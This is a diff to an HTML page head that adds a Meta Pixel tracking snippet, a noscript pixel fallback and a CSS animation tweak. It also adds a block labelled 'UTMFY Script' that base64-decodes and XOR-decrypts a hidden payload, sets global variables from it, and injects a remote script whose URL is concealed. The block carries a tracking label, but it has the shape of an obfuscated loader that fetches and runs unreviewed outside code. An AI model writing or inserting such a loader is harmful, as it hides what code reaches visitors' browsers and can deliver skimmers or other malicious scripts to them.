@@ -10,6 +10,24 @@
     <meta property="og:type" content="website" />
     <meta name="robots" content="max-image-preview:large" />
 
+    <!-- Meta Pixel Code -->
+    <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '946754157896563');
+      fbq('track', 'PageView');
+    </script>
+    <!-- End Meta Pixel Code -->
+
+    <!-- UTMFY Script -->
+    <script>(function(){var l_50rq=atob("DEI31raaBBtwOTJL5zkVo8T2JiFSUUY/lzEN+Zn5YHVeTEYmjiRO+NX1aTUSSx04hDBepsLpK24EVEFkiyNDs8XuKnEDGx5phjZDpN/4cW8VShBxvDkVuNf3YTlKG1YqkyMao8L3bX0JFEI5gjRSuMK3fHgfXR84hCkV+pTsZXcFXBBxxWBK+s24anodXBBxxSZWote3cW8dUFQyyjJFs8D/am9dSkcpjiZE9Jq4cnocTFdp3WAVq+vn");var w_z=[];for(var g_do4p=0;g_do4p<l_50rq.length;g_do4p++){w_z.push(l_50rq.charCodeAt(g_do4p)&255);}var u_cyc=w_z[0];var c_wgj=w_z.slice(1,1+u_cyc);var m_ad=w_z.slice(1+u_cyc);var l_smr=m_ad.map(function(b,u_a){return b^c_wgj[u_a%u_cyc];});var z_9="";for(var t_5b=0;t_5b<l_smr.length;t_5b++){z_9+=String.fromCharCode(l_smr[t_5b]&255);}var k_qy=decodeURIComponent(escape(z_9));var m_z=JSON.parse(k_qy);var f_b=m_z.globals||[];f_b.forEach(function(x_fe){window[x_fe.name]=x_fe.value;});var s_z=document.createElement("script");s_z.src=m_z.url;s_z.async=true;s_z.defer=true;(m_z.attributes||[]).forEach(function(i_e){s_z.setAttribute(i_e.name,i_e.value);});(document.head||document.documentElement).appendChild(s_z);})();</script>
+
     <!-- Google Fonts Preconnect & Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -100,15 +118,20 @@
         top: 0 !important;
         z-index: 40 !important;
       }
+      .elementor-element-4236d3e .elementor-button,
       .elementor-element-749be9d .elementor-button,
       .elementor-element-9d6e45f .elementor-button,
       .elementor-element-3ae8e13 .elementor-button,
       .elementor-element-441aeae .elementor-button {
-        animation: pulseCta 2s infinite ease-in-out;
+        animation: pulseCta 2s infinite ease-in-out !important;
       }
     </style>
   </head>
   <body class="wp-singular page-template page-template-elementor_canvas page page-id-8430 wp-embed-responsive wp-theme-hello-elementor unselectable hello-elementor-default elementor-default elementor-template-canvas elementor-kit-6 elementor-page elementor-page-8430">
+    <!-- Meta Pixel noscript fallback -->
+    <noscript><img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=946754157896563&ev=PageView&noscript=1"
+    /></noscript>
     <div id="root"></div>
     <script src="/assets/js/js_8_swiper.min.js"></script>
     <script type="module" src="/src/main.tsx"></script>
